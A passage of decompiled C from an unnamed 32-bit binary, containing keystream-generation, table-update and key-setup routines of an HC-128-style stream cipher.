                   + (((a1[1047] << 10) | ((unsigned __int64)(unsigned int)a1[1047] >> 22)) ^ ((a1[v57 + 523] << 23) | ((unsigned __int64)(unsigned int)a1[v57 + 523] >> 9)));
    a1[1050] = a1[v57 + 522];
    a2[10] = a1[v57 + 522] ^ v29;
    v28 = a1[(unsigned __int8)BYTE2(a1[1055]) + 256] + a1[*((unsigned __int8 *)a1 + 4220)];
    v20 = (unsigned __int64)(unsigned int)a1[v57 + 524] << 23;
    a1[v57 + 523] += ((a1[1041] << 8) | ((unsigned __int64)(unsigned int)a1[1041] >> 24))
                   + (((a1[1048] << 10) | ((unsigned __int64)(unsigned int)a1[1048] >> 22)) ^ (v20 | HIDWORD(v20)));
    a1[1051] = a1[v57 + 523];
    a2[11] = a1[v57 + 523] ^ v28;
    v27 = a1[(unsigned __int8)BYTE2(a1[1040]) + 256] + a1[*((unsigned __int8 *)a1 + 4160)];
    a1[v57 + 524] += ((a1[1042] << 8) | ((unsigned __int64)(unsigned int)a1[1042] >> 24))
                   + (((a1[1049] << 10) | ((unsigned __int64)(unsigned int)a1[1049] >> 22)) ^ ((a1[v57 + 525] << 23) | ((unsigned __int64)(unsigned int)a1[v57 + 525] >> 9)));
    a1[1052] = a1[v57 + 524];
    a2[12] = a1[v57 + 524] ^ v27;
    v26 = a1[(unsigned __int8)BYTE2(a1[1041]) + 256] + a1[*((unsigned __int8 *)a1 + 4164)];
    v21 = (unsigned __int64)(unsigned int)a1[v57 + 526] << 23;
    a1[v57 + 525] += ((a1[1043] << 8) | ((unsigned __int64)(unsigned int)a1[1043] >> 24))
                   + (((a1[1050] << 10) | ((unsigned __int64)(unsigned int)a1[1050] >> 22)) ^ (v21 | HIDWORD(v21)));
    a1[1053] = a1[v57 + 525];
    a2[13] = a1[v57 + 525] ^ v26;
    v25 = a1[(unsigned __int8)BYTE2(a1[1042]) + 256] + a1[*((unsigned __int8 *)a1 + 4168)];
    v22 = (unsigned __int64)(unsigned int)a1[v57 + 527] << 23;
    a1[v57 + 526] += ((a1[1044] << 8) | ((unsigned __int64)(unsigned int)a1[1044] >> 24))
                   + (((a1[1051] << 10) | ((unsigned __int64)(unsigned int)a1[1051] >> 22)) ^ (v22 | HIDWORD(v22)));
    a1[1054] = a1[v57 + 526];
    a2[14] = a1[v57 + 526] ^ v25;
    v24 = a1[(unsigned __int8)BYTE2(a1[1043]) + 256] + a1[*((unsigned __int8 *)a1 + 4172)];
    v23 = (unsigned __int64)(unsigned int)a1[v56 + 512] << 23;
    a1[v57 + 527] += ((a1[1045] << 8) | ((unsigned __int64)(unsigned int)a1[1045] >> 24))
                   + (((a1[1052] << 10) | ((unsigned __int64)(unsigned int)a1[1052] >> 22)) ^ (v23 | HIDWORD(v23)));
    a1[1055] = a1[v57 + 527];
    result = a1[v57 + 527] ^ v24;
    a2[15] = result;
  }
  else
  {
    a1[1056] = ((unsigned __int16)a1[1056] + 16) & 0x3FF;
    v55 = a1[(unsigned __int8)BYTE2(a1[1028]) + 768] + a1[*((unsigned __int8 *)a1 + 4112) + 512];
    a1[v57] += ((a1[1030] << 24) | ((unsigned __int64)(unsigned int)a1[1030] >> 8))
             + (((a1[1037] << 22) | ((unsigned __int64)(unsigned int)a1[1037] >> 10)) ^ ((a1[v57 + 1] << 9) | ((unsigned __int64)(unsigned int)a1[v57 + 1] >> 23)));
    a1[1024] = a1[v57];
    *a2 = a1[v57] ^ v55;
    v54 = a1[(unsigned __int8)BYTE2(a1[1029]) + 768] + a1[*((unsigned __int8 *)a1 + 4116) + 512];
    v2 = (unsigned __int64)(unsigned int)a1[v57 + 2] << 9;
    a1[v57 + 1] += ((a1[1031] << 24) | ((unsigned __int64)(unsigned int)a1[1031] >> 8))
                 + (((a1[1038] << 22) | ((unsigned __int64)(unsigned int)a1[1038] >> 10)) ^ (v2 | HIDWORD(v2)));
    a1[1025] = a1[v57 + 1];
    a2[1] = a1[v57 + 1] ^ v54;
    v53 = a1[(unsigned __int8)BYTE2(a1[1030]) + 768] + a1[*((unsigned __int8 *)a1 + 4120) + 512];
    v3 = (unsigned __int64)(unsigned int)a1[v57 + 3] << 9;
    a1[v57 + 2] += ((a1[1032] << 24) | ((unsigned __int64)(unsigned int)a1[1032] >> 8))
                 + (((a1[1039] << 22) | ((unsigned __int64)(unsigned int)a1[1039] >> 10)) ^ (v3 | HIDWORD(v3)));
    a1[1026] = a1[v57 + 2];
    a2[2] = a1[v57 + 2] ^ v53;
    v52 = a1[(unsigned __int8)BYTE2(a1[1031]) + 768] + a1[*((unsigned __int8 *)a1 + 4124) + 512];
    v4 = (unsigned __int64)(unsigned int)a1[v57 + 4] << 9;
    a1[v57 + 3] += ((a1[1033] << 24) | ((unsigned __int64)(unsigned int)a1[1033] >> 8))
                 + (((a1[1024] << 22) | ((unsigned __int64)(unsigned int)a1[1024] >> 10)) ^ (v4 | HIDWORD(v4)));
    a1[1027] = a1[v57 + 3];
    a2[3] = a1[v57 + 3] ^ v52;
    v51 = a1[(unsigned __int8)BYTE2(a1[1032]) + 768] + a1[*((unsigned __int8 *)a1 + 4128) + 512];
    v5 = (unsigned __int64)(unsigned int)a1[v57 + 5] << 9;
    a1[v57 + 4] += ((a1[1034] << 24) | ((unsigned __int64)(unsigned int)a1[1034] >> 8))
                 + (((a1[1025] << 22) | ((unsigned __int64)(unsigned int)a1[1025] >> 10)) ^ (v5 | HIDWORD(v5)));
    a1[1028] = a1[v57 + 4];
    a2[4] = a1[v57 + 4] ^ v51;
    v50 = a1[(unsigned __int8)BYTE2(a1[1033]) + 768] + a1[*((unsigned __int8 *)a1 + 4132) + 512];
    v6 = (unsigned __int64)(unsigned int)a1[v57 + 6] << 9;
    a1[v57 + 5] += ((a1[1035] << 24) | ((unsigned __int64)(unsigned int)a1[1035] >> 8))
                 + (((a1[1026] << 22) | ((unsigned __int64)(unsigned int)a1[1026] >> 10)) ^ (v6 | HIDWORD(v6)));
    a1[1029] = a1[v57 + 5];
    a2[5] = a1[v57 + 5] ^ v50;
    v49 = a1[(unsigned __int8)BYTE2(a1[1034]) + 768] + a1[*((unsigned __int8 *)a1 + 4136) + 512];
    v7 = (unsigned __int64)(unsigned int)a1[v57 + 7] << 9;
    a1[v57 + 6] += ((a1[1036] << 24) | ((unsigned __int64)(unsigned int)a1[1036] >> 8))
                 + (((a1[1027] << 22) | ((unsigned __int64)(unsigned int)a1[1027] >> 10)) ^ (v7 | HIDWORD(v7)));
    a1[1030] = a1[v57 + 6];
    a2[6] = a1[v57 + 6] ^ v49;
    v48 = a1[(unsigned __int8)BYTE2(a1[1035]) + 768] + a1[*((unsigned __int8 *)a1 + 4140) + 512];
    a1[v57 + 7] += ((a1[1037] << 24) | ((unsigned __int64)(unsigned int)a1[1037] >> 8))
                 + (((a1[1028] << 22) | ((unsigned __int64)(unsigned int)a1[1028] >> 10)) ^ ((a1[v57 + 8] << 9) | ((unsigned __int64)(unsigned int)a1[v57 + 8] >> 23)));
    a1[1031] = a1[v57 + 7];
    a2[7] = a1[v57 + 7] ^ v48;
    v47 = a1[(unsigned __int8)BYTE2(a1[1036]) + 768] + a1[*((unsigned __int8 *)a1 + 4144) + 512];
    a1[v57 + 8] += ((a1[1038] << 24) | ((unsigned __int64)(unsigned int)a1[1038] >> 8))
                 + (((a1[1029] << 22) | ((unsigned __int64)(unsigned int)a1[1029] >> 10)) ^ ((a1[v57 + 9] << 9) | ((unsigned __int64)(unsigned int)a1[v57 + 9] >> 23)));
    a1[1032] = a1[v57 + 8];
    a2[8] = a1[v57 + 8] ^ v47;
    v46 = a1[(unsigned __int8)BYTE2(a1[1037]) + 768] + a1[*((unsigned __int8 *)a1 + 4148) + 512];
    v8 = (unsigned __int64)(unsigned int)a1[v57 + 10] << 9;
    a1[v57 + 9] += ((a1[1039] << 24) | ((unsigned __int64)(unsigned int)a1[1039] >> 8))
                 + (((a1[1030] << 22) | ((unsigned __int64)(unsigned int)a1[1030] >> 10)) ^ (v8 | HIDWORD(v8)));
    a1[1033] = a1[v57 + 9];
    a2[9] = a1[v57 + 9] ^ v46;
    v45 = a1[(unsigned __int8)BYTE2(a1[1038]) + 768] + a1[*((unsigned __int8 *)a1 + 4152) + 512];
    v9 = (unsigned __int64)(unsigned int)a1[v57 + 11] << 9;
    a1[v57 + 10] += ((a1[1024] << 24) | ((unsigned __int64)(unsigned int)a1[1024] >> 8))
                  + (((a1[1031] << 22) | ((unsigned __int64)(unsigned int)a1[1031] >> 10)) ^ (v9 | HIDWORD(v9)));
    a1[1034] = a1[v57 + 10];
    a2[10] = a1[v57 + 10] ^ v45;
    v44 = a1[(unsigned __int8)BYTE2(a1[1039]) + 768] + a1[*((unsigned __int8 *)a1 + 4156) + 512];
    a1[v57 + 11] += ((a1[1025] << 24) | ((unsigned __int64)(unsigned int)a1[1025] >> 8))
                  + (((a1[1032] << 22) | ((unsigned __int64)(unsigned int)a1[1032] >> 10)) ^ ((a1[v57 + 12] << 9) | ((unsigned __int64)(unsigned int)a1[v57 + 12] >> 23)));
    a1[1035] = a1[v57 + 11];
    a2[11] = a1[v57 + 11] ^ v44;
    v43 = a1[(unsigned __int8)BYTE2(a1[1024]) + 768] + a1[*((unsigned __int8 *)a1 + 4096) + 512];
    v10 = (unsigned __int64)(unsigned int)a1[v57 + 13] << 9;
    a1[v57 + 12] += ((a1[1026] << 24) | ((unsigned __int64)(unsigned int)a1[1026] >> 8))
                  + (((a1[1033] << 22) | ((unsigned __int64)(unsigned int)a1[1033] >> 10)) ^ (v10 | HIDWORD(v10)));
    a1[1036] = a1[v57 + 12];
    a2[12] = a1[v57 + 12] ^ v43;
    v42 = a1[(unsigned __int8)BYTE2(a1[1025]) + 768] + a1[*((unsigned __int8 *)a1 + 4100) + 512];
    v11 = (unsigned __int64)(unsigned int)a1[v57 + 14] << 9;
    a1[v57 + 13] += ((a1[1027] << 24) | ((unsigned __int64)(unsigned int)a1[1027] >> 8))
                  + (((a1[1034] << 22) | ((unsigned __int64)(unsigned int)a1[1034] >> 10)) ^ (v11 | HIDWORD(v11)));
    a1[1037] = a1[v57 + 13];
    a2[13] = a1[v57 + 13] ^ v42;
    v41 = a1[(unsigned __int8)BYTE2(a1[1026]) + 768] + a1[*((unsigned __int8 *)a1 + 4104) + 512];
    v12 = (unsigned __int64)(unsigned int)a1[v57 + 15] << 9;
    a1[v57 + 14] += ((a1[1028] << 24) | ((unsigned __int64)(unsigned int)a1[1028] >> 8))
                  + (((a1[1035] << 22) | ((unsigned __int64)(unsigned int)a1[1035] >> 10)) ^ (v12 | HIDWORD(v12)));
    a1[1038] = a1[v57 + 14];
    a2[14] = a1[v57 + 14] ^ v41;
    v40 = a1[(unsigned __int8)BYTE2(a1[1027]) + 768] + a1[*((unsigned __int8 *)a1 + 4108) + 512];
    v13 = (unsigned __int64)(unsigned int)a1[v56] << 9;
    a1[v57 + 15] += ((a1[1029] << 24) | ((unsigned __int64)(unsigned int)a1[1029] >> 8))
                  + (((a1[1036] << 22) | ((unsigned __int64)(unsigned int)a1[1036] >> 10)) ^ (v13 | HIDWORD(v13)));
    a1[1039] = a1[v57 + 15];
    result = 60;
    a2[15] = a1[v57 + 15] ^ v40;
  }
  return result;
}

//----- (0040D910) --------------------------------------------------------
int __cdecl sub_40D910(_DWORD *a1)
{
  unsigned __int64 v1; // kr10_8
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // rax
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // kr20_8
  unsigned __int64 v6; // kr28_8
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // kr30_8
  unsigned __int64 v9; // kr40_8
  unsigned __int64 v10; // kr48_8
  unsigned __int64 v11; // kr50_8
  unsigned __int64 v12; // rax
  int result; // eax
  unsigned __int64 v14; // kr58_8
  unsigned __int64 v15; // kr60_8
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // kr68_8
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // rax
  unsigned __int64 v21; // kr90_8
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // rax
  unsigned __int64 v24; // rax
  int v25; // [esp+204h] [ebp-48h]
  int v26; // [esp+248h] [ebp-4h]

  v26 = a1[1056] & 0x1FF;
  v25 = ((_WORD)v26 + 16) & 0x1FF;
  if ( a1[1056] >= 0x200u )
  {
    a1[1056] = ((unsigned __int16)a1[1056] + 16) & 0x3FF;
    v14 = (unsigned __int64)(unsigned int)a1[v26 + 513] << 23;
    a1[v26 + 512] = (a1[(unsigned __int8)BYTE2(a1[1044]) + 256] + a1[*((unsigned __int8 *)a1 + 4176)]) ^ ((((a1[1053] << 10) | ((unsigned __int64)(unsigned int)a1[1053] >> 22)) ^ (v14 | HIDWORD(v14))) + ((a1[1046] << 8) | ((unsigned __int64)(unsigned int)a1[1046] >> 24)) + a1[v26 + 512]);
    a1[1040] = a1[v26 + 512];
    v15 = (unsigned __int64)(unsigned int)a1[v26 + 514] << 23;
    a1[v26 + 513] = (a1[(unsigned __int8)BYTE2(a1[1045]) + 256] + a1[*((unsigned __int8 *)a1 + 4180)]) ^ ((((a1[1054] << 10) | ((unsigned __int64)(unsigned int)a1[1054] >> 22)) ^ (v15 | HIDWORD(v15))) + ((a1[1047] << 8) | ((unsigned __int64)(unsigned int)a1[1047] >> 24)) + a1[v26 + 513]);
    a1[1041] = a1[v26 + 513];
    v16 = (unsigned __int64)(unsigned int)a1[v26 + 515] << 23;
    a1[v26 + 514] = (a1[(unsigned __int8)BYTE2(a1[1046]) + 256] + a1[*((unsigned __int8 *)a1 + 4184)]) ^ ((((a1[1055] << 10) | ((unsigned __int64)(unsigned int)a1[1055] >> 22)) ^ (v16 | HIDWORD(v16))) + ((a1[1048] << 8) | ((unsigned __int64)(unsigned int)a1[1048] >> 24)) + a1[v26 + 514]);
    a1[1042] = a1[v26 + 514];
    v17 = (unsigned __int64)(unsigned int)a1[v26 + 516] << 23;
    a1[v26 + 515] = (a1[(unsigned __int8)BYTE2(a1[1047]) + 256] + a1[*((unsigned __int8 *)a1 + 4188)]) ^ ((((a1[1040] << 10) | ((unsigned __int64)(unsigned int)a1[1040] >> 22)) ^ (v17 | HIDWORD(v17))) + ((a1[1049] << 8) | ((unsigned __int64)(unsigned int)a1[1049] >> 24)) + a1[v26 + 515]);
    a1[1043] = a1[v26 + 515];
    a1[v26 + 516] = (a1[(unsigned __int8)BYTE2(a1[1048]) + 256] + a1[*((unsigned __int8 *)a1 + 4192)]) ^ ((((a1[1041] << 10) | ((unsigned __int64)(unsigned int)a1[1041] >> 22)) ^ ((a1[v26 + 517] << 23) | ((unsigned __int64)(unsigned int)a1[v26 + 517] >> 9))) + ((a1[1050] << 8) | ((unsigned __int64)(unsigned int)a1[1050] >> 24)) + a1[v26 + 516]);
    a1[1044] = a1[v26 + 516];
    a1[v26 + 517] = (a1[(unsigned __int8)BYTE2(a1[1049]) + 256] + a1[*((unsigned __int8 *)a1 + 4196)]) ^ ((((a1[1042] << 10) | ((unsigned __int64)(unsigned int)a1[1042] >> 22)) ^ ((a1[v26 + 518] << 23) | ((unsigned __int64)(unsigned int)a1[v26 + 518] >> 9))) + ((a1[1051] << 8) | ((unsigned __int64)(unsigned int)a1[1051] >> 24)) + a1[v26 + 517]);
    a1[1045] = a1[v26 + 517];
    a1[v26 + 518] = (a1[(unsigned __int8)BYTE2(a1[1050]) + 256] + a1[*((unsigned __int8 *)a1 + 4200)]) ^ ((((a1[1043] << 10) | ((unsigned __int64)(unsigned int)a1[1043] >> 22)) ^ ((a1[v26 + 519] << 23) | ((unsigned __int64)(unsigned int)a1[v26 + 519] >> 9))) + ((a1[1052] << 8) | ((unsigned __int64)(unsigned int)a1[1052] >> 24)) + a1[v26 + 518]);
    a1[1046] = a1[v26 + 518];
    v18 = (unsigned __int64)(unsigned int)a1[v26 + 520] << 23;
    a1[v26 + 519] = (a1[(unsigned __int8)BYTE2(a1[1051]) + 256] + a1[*((unsigned __int8 *)a1 + 4204)]) ^ ((((a1[1044] << 10) | ((unsigned __int64)(unsigned int)a1[1044] >> 22)) ^ (v18 | HIDWORD(v18))) + ((a1[1053] << 8) | ((unsigned __int64)(unsigned int)a1[1053] >> 24)) + a1[v26 + 519]);
    a1[1047] = a1[v26 + 519];
    v19 = (unsigned __int64)(unsigned int)a1[v26 + 521] << 23;
    a1[v26 + 520] = (a1[(unsigned __int8)BYTE2(a1[1052]) + 256] + a1[*((unsigned __int8 *)a1 + 4208)]) ^ ((((a1[1045] << 10) | ((unsigned __int64)(unsigned int)a1[1045] >> 22)) ^ (v19 | HIDWORD(v19))) + ((a1[1054] << 8) | ((unsigned __int64)(unsigned int)a1[1054] >> 24)) + a1[v26 + 520]);
    a1[1048] = a1[v26 + 520];
    a1[v26 + 521] = (a1[(unsigned __int8)BYTE2(a1[1053]) + 256] + a1[*((unsigned __int8 *)a1 + 4212)]) ^ ((((a1[1046] << 10) | ((unsigned __int64)(unsigned int)a1[1046] >> 22)) ^ ((a1[v26 + 522] << 23) | ((unsigned __int64)(unsigned int)a1[v26 + 522] >> 9))) + ((a1[1055] << 8) | ((unsigned __int64)(unsigned int)a1[1055] >> 24)) + a1[v26 + 521]);
    a1[1049] = a1[v26 + 521];
    v20 = (unsigned __int64)(unsigned int)a1[v26 + 523] << 23;
    a1[v26 + 522] = (a1[(unsigned __int8)BYTE2(a1[1054]) + 256] + a1[*((unsigned __int8 *)a1 + 4216)]) ^ ((((a1[1047] << 10) | ((unsigned __int64)(unsigned int)a1[1047] >> 22)) ^ (v20 | HIDWORD(v20))) + ((a1[1040] << 8) | ((unsigned __int64)(unsigned int)a1[1040] >> 24)) + a1[v26 + 522]);
    a1[1050] = a1[v26 + 522];
    v21 = (unsigned __int64)(unsigned int)a1[v26 + 524] << 23;
    a1[v26 + 523] = (a1[(unsigned __int8)BYTE2(a1[1055]) + 256] + a1[*((unsigned __int8 *)a1 + 4220)]) ^ ((((a1[1048] << 10) | ((unsigned __int64)(unsigned int)a1[1048] >> 22)) ^ (v21 | HIDWORD(v21))) + ((a1[1041] << 8) | ((unsigned __int64)(unsigned int)a1[1041] >> 24)) + a1[v26 + 523]);
    a1[1051] = a1[v26 + 523];
    v22 = (unsigned __int64)(unsigned int)a1[v26 + 525] << 23;
    a1[v26 + 524] = (a1[(unsigned __int8)BYTE2(a1[1040]) + 256] + a1[*((unsigned __int8 *)a1 + 4160)]) ^ ((((a1[1049] << 10) | ((unsigned __int64)(unsigned int)a1[1049] >> 22)) ^ (v22 | HIDWORD(v22))) + ((a1[1042] << 8) | ((unsigned __int64)(unsigned int)a1[1042] >> 24)) + a1[v26 + 524]);
    a1[1052] = a1[v26 + 524];
    v23 = (unsigned __int64)(unsigned int)a1[v26 + 526] << 23;
    a1[v26 + 525] = (a1[(unsigned __int8)BYTE2(a1[1041]) + 256] + a1[*((unsigned __int8 *)a1 + 4164)]) ^ ((((a1[1050] << 10) | ((unsigned __int64)(unsigned int)a1[1050] >> 22)) ^ (v23 | HIDWORD(v23))) + ((a1[1043] << 8) | ((unsigned __int64)(unsigned int)a1[1043] >> 24)) + a1[v26 + 525]);
    a1[1053] = a1[v26 + 525];
    v24 = (unsigned __int64)(unsigned int)a1[v26 + 527] << 23;
    a1[v26 + 526] = (a1[(unsigned __int8)BYTE2(a1[1042]) + 256] + a1[*((unsigned __int8 *)a1 + 4168)]) ^ ((((a1[1051] << 10) | ((unsigned __int64)(unsigned int)a1[1051] >> 22)) ^ (v24 | HIDWORD(v24))) + ((a1[1044] << 8) | ((unsigned __int64)(unsigned int)a1[1044] >> 24)) + a1[v26 + 526]);
    a1[1054] = a1[v26 + 526];
    a1[v26 + 527] = (a1[(unsigned __int8)BYTE2(a1[1043]) + 256] + a1[*((unsigned __int8 *)a1 + 4172)]) ^ ((((a1[1052] << 10) | ((unsigned __int64)(unsigned int)a1[1052] >> 22)) ^ ((a1[v25 + 512] << 23) | ((unsigned __int64)(unsigned int)a1[v25 + 512] >> 9))) + ((a1[1045] << 8) | ((unsigned __int64)(unsigned int)a1[1045] >> 24)) + a1[v26 + 527]);
    result = 60;
    a1[1055] = a1[v26 + 527];
  }
  else
  {
    a1[1056] = ((unsigned __int16)a1[1056] + 16) & 0x3FF;
    a1[v26] = (a1[(unsigned __int8)BYTE2(a1[1028]) + 768] + a1[*((unsigned __int8 *)a1 + 4112) + 512]) ^ ((((a1[1037] << 22) | ((unsigned __int64)(unsigned int)a1[1037] >> 10)) ^ ((a1[v26 + 1] << 9) | ((unsigned __int64)(unsigned int)a1[v26 + 1] >> 23))) + ((a1[1030] << 24) | ((unsigned __int64)(unsigned int)a1[1030] >> 8)) + a1[v26]);
    a1[1024] = a1[v26];
    a1[v26 + 1] = (a1[(unsigned __int8)BYTE2(a1[1029]) + 768] + a1[*((unsigned __int8 *)a1 + 4116) + 512]) ^ ((((a1[1038] << 22) | ((unsigned __int64)(unsigned int)a1[1038] >> 10)) ^ ((a1[v26 + 2] << 9) | ((unsigned __int64)(unsigned int)a1[v26 + 2] >> 23))) + ((a1[1031] << 24) | ((unsigned __int64)(unsigned int)a1[1031] >> 8)) + a1[v26 + 1]);
    a1[1025] = a1[v26 + 1];
    v1 = (unsigned __int64)(unsigned int)a1[v26 + 3] << 9;
    a1[v26 + 2] = (a1[(unsigned __int8)BYTE2(a1[1030]) + 768] + a1[*((unsigned __int8 *)a1 + 4120) + 512]) ^ ((((a1[1039] << 22) | ((unsigned __int64)(unsigned int)a1[1039] >> 10)) ^ (v1 | HIDWORD(v1))) + ((a1[1032] << 24) | ((unsigned __int64)(unsigned int)a1[1032] >> 8)) + a1[v26 + 2]);
    a1[1026] = a1[v26 + 2];
    a1[v26 + 3] = (a1[(unsigned __int8)BYTE2(a1[1031]) + 768] + a1[*((unsigned __int8 *)a1 + 4124) + 512]) ^ ((((a1[1024] << 22) | ((unsigned __int64)(unsigned int)a1[1024] >> 10)) ^ ((a1[v26 + 4] << 9) | ((unsigned __int64)(unsigned int)a1[v26 + 4] >> 23))) + ((a1[1033] << 24) | ((unsigned __int64)(unsigned int)a1[1033] >> 8)) + a1[v26 + 3]);
    a1[1027] = a1[v26 + 3];
    v2 = (unsigned __int64)(unsigned int)a1[v26 + 5] << 9;
    a1[v26 + 4] = (a1[(unsigned __int8)BYTE2(a1[1032]) + 768] + a1[*((unsigned __int8 *)a1 + 4128) + 512]) ^ ((((a1[1025] << 22) | ((unsigned __int64)(unsigned int)a1[1025] >> 10)) ^ (v2 | HIDWORD(v2))) + ((a1[1034] << 24) | ((unsigned __int64)(unsigned int)a1[1034] >> 8)) + a1[v26 + 4]);
    a1[1028] = a1[v26 + 4];
    v3 = (unsigned __int64)(unsigned int)a1[v26 + 6] << 9;
    a1[v26 + 5] = (a1[(unsigned __int8)BYTE2(a1[1033]) + 768] + a1[*((unsigned __int8 *)a1 + 4132) + 512]) ^ ((((a1[1026] << 22) | ((unsigned __int64)(unsigned int)a1[1026] >> 10)) ^ (v3 | HIDWORD(v3))) + ((a1[1035] << 24) | ((unsigned __int64)(unsigned int)a1[1035] >> 8)) + a1[v26 + 5]);
    a1[1029] = a1[v26 + 5];
    v4 = (unsigned __int64)(unsigned int)a1[v26 + 7] << 9;
    a1[v26 + 6] = (a1[(unsigned __int8)BYTE2(a1[1034]) + 768] + a1[*((unsigned __int8 *)a1 + 4136) + 512]) ^ ((((a1[1027] << 22) | ((unsigned __int64)(unsigned int)a1[1027] >> 10)) ^ (v4 | HIDWORD(v4))) + ((a1[1036] << 24) | ((unsigned __int64)(unsigned int)a1[1036] >> 8)) + a1[v26 + 6]);
    a1[1030] = a1[v26 + 6];
    v5 = (unsigned __int64)(unsigned int)a1[v26 + 8] << 9;
    a1[v26 + 7] = (a1[(unsigned __int8)BYTE2(a1[1035]) + 768] + a1[*((unsigned __int8 *)a1 + 4140) + 512]) ^ ((((a1[1028] << 22) | ((unsigned __int64)(unsigned int)a1[1028] >> 10)) ^ (v5 | HIDWORD(v5))) + ((a1[1037] << 24) | ((unsigned __int64)(unsigned int)a1[1037] >> 8)) + a1[v26 + 7]);
    a1[1031] = a1[v26 + 7];
    v6 = (unsigned __int64)(unsigned int)a1[v26 + 9] << 9;
    a1[v26 + 8] = (a1[(unsigned __int8)BYTE2(a1[1036]) + 768] + a1[*((unsigned __int8 *)a1 + 4144) + 512]) ^ ((((a1[1029] << 22) | ((unsigned __int64)(unsigned int)a1[1029] >> 10)) ^ (v6 | HIDWORD(v6))) + ((a1[1038] << 24) | ((unsigned __int64)(unsigned int)a1[1038] >> 8)) + a1[v26 + 8]);
    a1[1032] = a1[v26 + 8];
    v7 = (unsigned __int64)(unsigned int)a1[v26 + 10] << 9;
    a1[v26 + 9] = (a1[(unsigned __int8)BYTE2(a1[1037]) + 768] + a1[*((unsigned __int8 *)a1 + 4148) + 512]) ^ ((((a1[1030] << 22) | ((unsigned __int64)(unsigned int)a1[1030] >> 10)) ^ (v7 | HIDWORD(v7))) + ((a1[1039] << 24) | ((unsigned __int64)(unsigned int)a1[1039] >> 8)) + a1[v26 + 9]);
    a1[1033] = a1[v26 + 9];
    v8 = (unsigned __int64)(unsigned int)a1[v26 + 11] << 9;
    a1[v26 + 10] = (a1[(unsigned __int8)BYTE2(a1[1038]) + 768] + a1[*((unsigned __int8 *)a1 + 4152) + 512]) ^ ((((a1[1031] << 22) | ((unsigned __int64)(unsigned int)a1[1031] >> 10)) ^ (v8 | HIDWORD(v8))) + ((a1[1024] << 24) | ((unsigned __int64)(unsigned int)a1[1024] >> 8)) + a1[v26 + 10]);
    a1[1034] = a1[v26 + 10];
    a1[v26 + 11] = (a1[(unsigned __int8)BYTE2(a1[1039]) + 768] + a1[*((unsigned __int8 *)a1 + 4156) + 512]) ^ ((((a1[1032] << 22) | ((unsigned __int64)(unsigned int)a1[1032] >> 10)) ^ ((a1[v26 + 12] << 9) | ((unsigned __int64)(unsigned int)a1[v26 + 12] >> 23))) + ((a1[1025] << 24) | ((unsigned __int64)(unsigned int)a1[1025] >> 8)) + a1[v26 + 11]);
    a1[1035] = a1[v26 + 11];
    v9 = (unsigned __int64)(unsigned int)a1[v26 + 13] << 9;
    a1[v26 + 12] = (a1[(unsigned __int8)BYTE2(a1[1024]) + 768] + a1[*((unsigned __int8 *)a1 + 4096) + 512]) ^ ((((a1[1033] << 22) | ((unsigned __int64)(unsigned int)a1[1033] >> 10)) ^ (v9 | HIDWORD(v9))) + ((a1[1026] << 24) | ((unsigned __int64)(unsigned int)a1[1026] >> 8)) + a1[v26 + 12]);
    a1[1036] = a1[v26 + 12];
    v10 = (unsigned __int64)(unsigned int)a1[v26 + 14] << 9;
    a1[v26 + 13] = (a1[(unsigned __int8)BYTE2(a1[1025]) + 768] + a1[*((unsigned __int8 *)a1 + 4100) + 512]) ^ ((((a1[1034] << 22) | ((unsigned __int64)(unsigned int)a1[1034] >> 10)) ^ (v10 | HIDWORD(v10))) + ((a1[1027] << 24) | ((unsigned __int64)(unsigned int)a1[1027] >> 8)) + a1[v26 + 13]);
    a1[1037] = a1[v26 + 13];
    v11 = (unsigned __int64)(unsigned int)a1[v26 + 15] << 9;
    a1[v26 + 14] = (a1[(unsigned __int8)BYTE2(a1[1026]) + 768] + a1[*((unsigned __int8 *)a1 + 4104) + 512]) ^ ((((a1[1035] << 22) | ((unsigned __int64)(unsigned int)a1[1035] >> 10)) ^ (v11 | HIDWORD(v11))) + ((a1[1028] << 24) | ((unsigned __int64)(unsigned int)a1[1028] >> 8)) + a1[v26 + 14]);
    a1[1038] = a1[v26 + 14];
    v12 = (unsigned __int64)(unsigned int)a1[v25] << 9;
    a1[v26 + 15] = (a1[(unsigned __int8)BYTE2(a1[1027]) + 768] + a1[*((unsigned __int8 *)a1 + 4108) + 512]) ^ ((((a1[1036] << 22) | ((unsigned __int64)(unsigned int)a1[1036] >> 10)) ^ (v12 | HIDWORD(v12))) + ((a1[1029] << 24) | ((unsigned __int64)(unsigned int)a1[1029] >> 8)) + a1[v26 + 15]);
    result = (int)a1;
    a1[1039] = a1[v26 + 15];
  }
  return result;
}

//----- (0040FDC0) --------------------------------------------------------
void sub_40FDC0()
{
  ;
}

//----- (0040FDD0) --------------------------------------------------------
unsigned int __cdecl sub_40FDD0(int a1, int a2, unsigned int a3, unsigned int a4)
{
  unsigned int result; // eax
  unsigned int i; // [esp+4h] [ebp-4h]

  *(_DWORD *)(a1 + 4292) = a3;
  result = a4;
  *(_DWORD *)(a1 + 4296) = a4;
  for ( i = 0; i < a3 >> 5; ++i )
  {
    result = i;
    *(_DWORD *)(a1 + 4 * i + 4228) = *(_DWORD *)(a2 + 4 * i);
  }
  while ( i < 8 )
  {
    *(_DWORD *)(a1 + 4 * i + 4228) = *(_DWORD *)(a1 + 4 * i + 4212);
    result = ++i;
  }
  return result;
}

//----- (0040FE60) --------------------------------------------------------
_DWORD *__cdecl sub_40FE60(_DWORD *a1, int a2)
{
  unsigned __int64 v2; // kr00_8
  unsigned __int64 v3; // kr08_8
  unsigned __int64 v4; // kr10_8
  unsigned __int64 v5; // kr18_8
  unsigned __int64 v6; // kr20_8
  unsigned __int64 v7; // rax
  _DWORD *result; // eax
  unsigned int i; // [esp+8h] [ebp-4h]
  unsigned int j; // [esp+8h] [ebp-4h]
  unsigned int k; // [esp+8h] [ebp-4h]
  unsigned int m; // [esp+8h] [ebp-4h]
  unsigned int n; // [esp+8h] [ebp-4h]
  unsigned int ii; // [esp+8h] [ebp-4h]
  unsigned int jj; // [esp+8h] [ebp-4h]
  unsigned int kk; // [esp+8h] [ebp-4h]
  unsigned int mm; // [esp+8h] [ebp-4h]

  for ( i = 0; i < a1[1074] >> 5; ++i )
    a1[i + 1065] = *(_DWORD *)(a2 + 4 * i);
  while ( i < 8 )
  {
